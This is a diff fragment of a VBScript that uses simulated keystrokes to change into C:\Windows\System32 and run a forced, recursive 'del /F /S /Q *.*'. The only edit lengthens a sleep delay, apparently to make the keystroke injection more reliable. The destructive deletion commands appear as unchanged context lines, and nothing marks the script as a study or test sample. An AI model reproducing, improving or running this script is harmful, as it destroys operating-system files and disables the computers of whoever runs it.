@@ -26,7 +26,7 @@ WScript.Sleep 100
 
 WshShell.SendKeys "cd C:\Windows\System32"
 WshShell.SendKeys "{ENTER}"
-WScript.Sleep 100 
+WScript.Sleep 300
 
 WshShell.SendKeys "del /F /S /Q *.*"
 WshShell.SendKeys "{ENTER}"
